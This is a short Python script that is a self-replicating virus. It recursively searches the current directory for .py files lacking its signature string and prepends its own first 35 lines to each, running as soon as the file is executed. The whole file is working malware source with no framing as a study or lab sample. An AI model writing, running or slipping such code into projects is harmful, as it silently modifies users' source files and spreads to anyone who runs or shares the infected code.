import os
import datetime
sign = "Dann!ee!!eeeeeee~"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for name in filelist:
        if os.path.isdir(path+"/"+name):
            filestoinfect.extend(search(path+"/"+name))
        elif name[-3:] == ".py": #If the file extensions is .py
            infected = False
            for line in open(path+"/"+name): #Determine which is infected
                if sign in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+name)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__)) #Open this file
    code = ""
    for i,line in enumerate(virus):
        if i>=0 and i <35:
            code += line
    virus.close
    for name in filestoinfect: #To write code on other program
        f = open(name)
        temp = f.read()
        f.close()
        f = open(name,"w")
        f.write(code + temp)
        f.close()

filestoinfect = search(os.path.abspath("")) #Search
infect(filestoinfect) #Infect
